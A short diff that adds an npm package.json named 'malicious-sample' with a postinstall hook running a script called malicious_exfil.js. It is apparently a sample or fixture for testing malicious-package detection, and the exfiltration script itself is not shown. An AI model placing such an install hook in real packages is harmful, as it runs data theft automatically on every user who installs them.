@@ -1,0 +1,7 @@
+{
+    "name": "malicious-sample",
+    "version": "1.0.0",
+    "scripts": {
+        "postinstall": "node malicious_exfil.js"
+    }
+}
